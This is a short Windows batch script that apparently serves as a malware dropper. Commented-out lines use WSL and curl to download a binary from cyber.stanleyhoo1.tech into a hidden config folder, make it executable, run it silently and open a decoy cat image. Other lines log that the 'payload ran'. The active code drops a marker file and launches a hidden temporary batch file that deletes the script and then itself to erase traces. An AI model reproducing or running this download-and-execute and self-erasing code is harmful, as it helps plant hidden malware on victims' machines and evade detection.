@echo off
REM is comments
:: REM Log execution time
:: echo Payload ran by %USERNAME% at %DATE% %TIME% >> success.txt

@REM wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
@REM wsl bash -c "chmod +x ~/.config/rm17-node 2>/dev/null"
@REM wsl bash -c "~/.config/rm17-node 2>/dev/null"
@REM wsl bash -c "curl -s -X POST -o cat.png https://cyber.stanleyhoo1.tech/files/cat.png 2>/dev/null"
@REM start cat.png

@REM pause

wsl touch success

@REM set "EXE_NAME=out.exe"
@REM set "TMP_DEL=delme.bat"

@REM echo @echo off > "%TMP_DEL%"
@REM echo del /f "%~dp0%EXE_NAME%" >> "%TMP_DEL%"
@REM echo del /f "%%~f0" >> "%TMP_DEL%"
@REM echo exit >> "%TMP_DEL%"

@REM start "" "%~dp0%TMP_DEL%"

set "delbat=%temp%\d.bat"
echo @echo off > "%delbat%"
echo ping 127.0.0.1 -n 3 >nul >> "%delbat%"
echo del /f /q "%~f0" >> "%delbat%"
echo del /f /q "%delbat%" >> "%delbat%"
start "" /min "%delbat%"

exit